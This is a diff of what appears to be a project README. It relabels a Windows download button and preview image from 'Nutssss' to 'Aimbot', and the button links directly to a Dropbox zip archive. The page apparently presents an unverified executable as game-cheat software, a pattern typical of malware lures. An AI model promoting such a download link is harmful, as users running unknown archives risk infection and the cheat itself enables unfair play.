@@ -8,7 +8,7 @@
 
 <p align="center">  
   <a href="https://www.dropbox.com/scl/fi/fq41merkf19o5j4kqplwk/windows_x64.zip?rlkey=zrn54s3sscidxvb81fqnhzqm5&st=ybhg3kaa&dl=1">  
-    <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Download Nutssss for Windows">  
+    <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Download Aimbot for Windows">  
   </a>  
 </p>
 
@@ -26,7 +26,7 @@
 ---
 
 <div align="center">  
-  <img src="https://i.ytimg.com/vi/RNnJoYIrl7I/maxresdefault.jpg" width="1080" alt="Nutssss Mod Preview"/>  
+  <img src="https://user-images.githubusercontent.com/104287840/214996773-b5d419f7-84f0-4d93-ae41-244c62ec6a31.png" width="1080" alt="Aimbot Mod Preview"/>  
 </div>  
 
 <br>
